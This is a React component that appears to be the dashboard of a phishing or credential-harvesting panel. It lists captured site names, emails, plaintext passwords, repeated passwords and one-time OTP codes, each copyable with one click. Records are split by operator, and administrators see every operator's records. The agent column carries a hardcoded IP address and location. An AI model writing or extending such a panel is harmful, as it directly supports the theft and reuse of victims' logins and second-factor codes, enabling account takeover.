import { useContext, useEffect, useState } from "react";
import { getData } from "../../api/fetching";
import { formatUtcToLocal } from "../../utils/DateFormater";
import { AuthContext } from "../../Contexts/AuthProvider";
import { handleCopyClick } from "../../utils/copyToClipboard";
import Loader from "../../common/Loader";


const InformationTable = () => {
  const {role,user} = useContext(AuthContext)
  const [loading,setLoading] = useState(false)
  const [info,setInfo] = useState<[]>([])

console.log(info);

  let url:string;
  useEffect(() => {
    const fetchData = async () => {
      setLoading(true)
      try {
       
        if(role==='admin'){
          url = `information`
        }else{
          url = `information?id=${user?.id}`
        }
        const data = await getData(url);
        setInfo((data as any)?.data);
        setLoading(false)
      } catch (error) {
        console.error('Error fetching data:', error);
        setLoading(false)
      }
    };

    fetchData();
  }, [user]);


    return (
      <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
        <h4 className="mb-6 text-xl font-semibold text-black dark:text-white">
         All User Informations
        </h4>
  
  {/* for table */}
  
  <div className="relative overflow-x-auto shadow-md sm:rounded-lg mb-8">
  {
         loading && (
          <div>
            <Loader/>
          </div>
         )
      }
    <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400 border">
      <thead className="text-xs text-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
        <tr>
          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
            ID
          </th>
          {
            role === 'admin' && (
              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
              Name
            </th>
            )
          }

          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
           Site
          </th>
          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
            Email
          </th>
          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
            Password
          </th>
          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
            Confirm Password
          </th>
          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
            OTP Code
          </th>
          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
           Agent
          </th>

          <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
            Time
          </th>


   
        </tr>
      </thead>

      <tbody className='text-center'>
        {
          info?.map(({user,updatedAt,email,password,repassword,otp,siteName,_id},index)=>(
<tr key={_id} className="odd:bg-stroke odd:dark:bg-black even:bg-transparent even:dark:bg-body -t dark:-gray-700 even:dark:text-white">
    <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
        {index + 1}
    </th>

    {
       role === 'admin' && (
        <td className="px-2 py-1 font-bold cursor-pointer ">
        {(user as any)?.name}
    </td>
       )
    }
    <td onClick={()=> handleCopyClick(siteName)} className="px-2 py-1 font-bold cursor-pointer  ">
      <span className="text-bodydark1 even:bg-meta-7  odd:bg-meta-4 rounded-md p-1 font-bold ">{siteName}</span>
        
    </td>
    <td onClick={()=> handleCopyClick(email)} className="px-2 py-1 font-bold cursor-pointer ">
        {email}
    </td>
    <td onClick={()=> handleCopyClick(password)} className="px-2 py-1 font-bold cursor-pointer ">
        {password}
    </td>
    <td onClick={()=> handleCopyClick(repassword)} className="px-2 py-1 font-bold cursor-pointer ">
        {repassword}
    </td>
    <td onClick={()=> handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
        {otp}
    </td>


    <td className="px-2 py-1 font-bold cursor-pointer ">
        <div className="relative inline-block">
  <button className="tooltip-btn">View</button>
  <div className="tooltip"> 103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka</div>
</div>
    </td>
    <td onClick={()=> handleCopyClick(formatUtcToLocal(updatedAt))} className="px-2 py-1 font-bold cursor-pointer">
        {formatUtcToLocal(updatedAt)}
    </td>
</tr>

          ))
        }
  

  
  
  
  
      </tbody>
    </table>
  </div>
  
  
  
      </div>
    );
  };
  
  export default InformationTable;
  